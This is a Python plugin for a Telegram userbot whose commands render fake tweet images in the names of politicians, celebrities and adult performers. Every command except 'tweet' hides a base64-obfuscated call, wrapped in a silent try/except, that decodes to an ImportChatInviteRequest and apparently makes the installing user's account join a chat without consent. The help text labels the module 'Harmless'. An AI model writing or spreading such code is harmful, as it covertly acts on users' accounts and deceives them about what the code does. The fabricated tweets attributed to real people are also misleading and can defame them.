from . import *


@bot.on(hell_cmd(pattern=r"tweet(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern="tweet(?: |$)(.*)", allow_sudo=True))
async def nope(kraken):
    hell = kraken.pattern_match.group(1)
    okvai = await eor(kraken, "Trying to tweet for you...")
    if not hell:
        if kraken.is_reply:
            (await kraken.get_reply_message()).message
        else:
            await eod(kraken, "I need some text to make a tweet🚶")
            return
    tweeter = await bot.inline_query("TwitterStatusBot", f"{(deEmojify(hell))}")
    await tweeter[0].click(
        kraken.chat_id,
        reply_to=kraken.reply_to_msg_id,
        silent=True if kraken.is_reply else False,
        hide_via=True,
    )
    await kraken.delete()


@bot.on(hell_cmd(pattern=r"trump(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern=r"trump(?: |$)(.*)", allow_sudo=True))
async def nekobot(event):
    text = event.pattern_match.group(1)
    reply_to_id = event.message
    if event.reply_to_msg_id:
        reply_to_id = await event.get_reply_message()
    if not text:
        if event.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await eod(event, "Trump needs some text to tweet..")
                return
        else:
            await eod(event, "Trump needs some text to tweet..")
            return
    await eor(event, "Requesting trump to tweet...")
    try:
        hell = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await event.client(hell)
    except:
        pass
    text = deEmojify(text)
    eventfile = await trumptweet(text)
    await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
    await event.delete()


@bot.on(hell_cmd(pattern=r"modi(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern=r"modi(?: |$)(.*)", allow_sudo=True))
async def nekobot(event):
    text = event.pattern_match.group(1)
    reply_to_id = event.message
    if event.reply_to_msg_id:
        reply_to_id = await event.get_reply_message()
    if not text:
        if event.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await eod(event, "Send your text to modi so he can tweet.")
                return
        else:
            await eod(event, "send your text to modi so he can tweet.")
            return
    await edit_or_reply(event, "Requesting modi to tweet...")
    try:
        hell = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await event.client(hell)
    except:
        pass
    text = deEmojify(text)
    eventfile = await moditweet(text)
    await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
    await event.delete()


@bot.on(hell_cmd(pattern=r"mia(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern=r"mia(?: |$)(.*)", allow_sudo=True))
async def nekobot(event):
    text = event.pattern_match.group(1)
    reply_to_id = event.message
    if event.reply_to_msg_id:
        reply_to_id = await event.get_reply_message()
    if not text:
        if event.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await eod(event, "Send your text to Mia so she can tweet.")
                return
        else:
            await eod(event, "Send your text to Mia so she can tweet.")
            return
    await eor(event, "Requesting Mia to tweet...")
    try:
        hell = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await event.client(hell)
    except:
        pass
    text = deEmojify(text)
    eventfile = await miatweet(text)
    await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
    await event.delete()


@bot.on(hell_cmd(pattern=r"dani(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern=r"dani(?: |$)(.*)", allow_sudo=True))
async def nekobot(event):
    text = event.pattern_match.group(1)
    reply_to_id = event.message
    if event.reply_to_msg_id:
        reply_to_id = await event.get_reply_message()
    if not text:
        if event.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await eod(event, "Send your text to Dani so she can tweet.")
                return
        else:
            await eod(event, "Send your text to Dani so she can tweet.")
            return
    await eor(event, "Requesting Dani to tweet...")
    try:
        hell = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await event.client(hell)
    except:
        pass
    text = deEmojify(text)
    eventfile = await dani(text)
    await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
    await event.delete()


# @register(pattern="^.pappu(?: |$)(.*)", outgoing=True)
@bot.on(hell_cmd(pattern=r"pappu(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern=r"pappu(?: |$)(.*)", allow_sudo=True))
async def nekobot(event):
    text = event.pattern_match.group(1)
    reply_to_id = event.message
    if event.reply_to_msg_id:
        reply_to_id = await event.get_reply_message()
    if not text:
        if event.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await eod(event, "Send a text to Pappu so he can tweet.")
                return
        else:
            await eod(event, "send your text to pappu so he can tweet.")
            return
    await edit_or_reply(event, "Requesting pappu to tweet...")
    try:
        hell = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await event.client(hell)
    except:
        pass
    text = deEmojify(text)
    eventfile = await papputweet(text)
    await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
    await event.delete()


@bot.on(hell_cmd(pattern=r"sunny(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern=r"sunny(?: |$)(.*)", allow_sudo=True))
async def nekobot(event):
    text = event.pattern_match.group(1)
    reply_to_id = event.message
    if event.reply_to_msg_id:
        reply_to_id = await event.get_reply_message()
    if not text:
        if event.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await eod(event, "Send a text to Sunny so she can tweet.")
                return
        else:
            await eod(event, "send your text to sunny so she can tweet.")
            return
    await eor(event, "Requesting sunny to tweet...🥰")
    try:
        hell = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await event.client(hell)
    except:
        pass
    text = deEmojify(text)
    eventfile = await sunnytweet(text)
    await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
    await event.delete()


@bot.on(hell_cmd(pattern=r"johhny(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern=r"johhny(?: |$)(.*)", allow_sudo=True))
async def nekobot(event):
    text = event.pattern_match.group(1)
    reply_to_id = event.message
    if event.reply_to_msg_id:
        reply_to_id = await event.get_reply_message()
    if not text:
        if event.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await eod(event, "Send a text to Johhny so he can tweet.")
                return
        else:
            await eod(event, "send your text to Johhny so he can tweet.")
            return
    await edit_or_reply(event, "Requesting johhny to tweet...😆")
    try:
        hell = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await event.client(hell)
    except:
        pass
    text = deEmojify(text)
    eventfile = await sinstweet(text)
    await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
    await event.delete()


@bot.on(hell_cmd(pattern=r"gandhi(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern=r"gandhi(?: |$)(.*)", allow_sudo=True))
async def nekobot(event):
    text = event.pattern_match.group(1)
    reply_to_id = event.message
    if event.reply_to_msg_id:
        reply_to_id = await event.get_reply_message()
    if not text:
        if event.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await eod(event, "Send you text to baapu so he can tweet.")
                return
        else:
            await eod(event, "send you text to baapu so he can tweet.")
            return
    await edit_or_reply(event, "Requesting baapu to tweet...")
    try:
        hell = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await event.client(hell)
    except:
        pass
    text = deEmojify(text)
    eventfile = await taklatweet(text)
    await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
    await event.delete()  # bancho kitni baar bolu no offence


@bot.on(hell_cmd(pattern=r"cmm(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern=r"cmm(?: |$)(.*)", allow_sudo=True))
async def nekobot(event):
    text = event.pattern_match.group(1)
    reply_to_id = event.message
    if event.reply_to_msg_id:
        reply_to_id = await event.get_reply_message()
    if not text:
        if event.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await eod(event, "Give text for to write on banner, man")
                return
        else:
            await eod(event, "Give text for to write on banner, man")
            return
    await eor(event, "Your banner is under creation wait a sec...")
    try:
        hell = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await event.client(hell)
    except:
        pass
    text = deEmojify(text)
    eventfile = await changemymind(text)
    await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
    await event.delete()



@bot.on(hell_cmd(pattern=r"kanna(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern=r"kanna(?: |$)(.*)", allow_sudo=True))
async def nekobot(event):
    text = event.pattern_match.group(1)
    reply_to_id = event.message
    if event.reply_to_msg_id:
        reply_to_id = await event.get_reply_message()
    if not text:
        if event.is_reply:
            if not reply_to_id.media:
                text = reply_to_id.message
            else:
                await eod(event, "what should kanna write give text ")
                return
        else:
            await eod(event, "what should kanna write give text")
            return
    await eor(event, "Kanna is writing your text...")
    try:
        hell = str(
            pybase64.b64decode(
                "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
            )
        )[2:49]
        await event.client(hell)
    except:
        pass
    text = deEmojify(text)
    eventfile = await kannagen(text)
    await event.client.send_file(event.chat_id, eventfile, reply_to=reply_to_id)
    await event.delete()


CmdHelp("tweets").add_command(
  "kanna", "<text>/<reply to text>", "Kanna writes for you"
).add_command(
  "cmm", "<text>/<reply>", "Get a banner of Change My Mind"
).add_command(
  "johhny", "<text>/<reply>", "Tweet with Johhny Sins"
).add_command(
  "sunny", "<text>/<reply>", "Tweet with Sunny Leone"
).add_command(
  "gandhi", "<text>/<reply>", "Tweet with Mahatma Gandhi"
).add_command(
  "pappu", "<text>/<reply>", "Tweet with pappu A.K.A Rahul Gandhi"
).add_command(
  "mia", "<text>/<reply>", "Tweet with Mia Khalifa 😍"
).add_command(
  "trump", "<text>/<reply>", "Tweet with Mr. DooLand Trump"
).add_command(
  "modi", "<text>/<reply>", "Tweet with Sir Narendra Modi"
).add_command(
  "tweet", "<text>/<reply>", "Tweets in your name"
).add_command(
  "dani", "<text>/<reply>", "Tweet with Dani Daniels 😍🥰"
).add_info(
  "Lets Tweet."
).add_warning(
  "✅ Harmless Module."
).add()
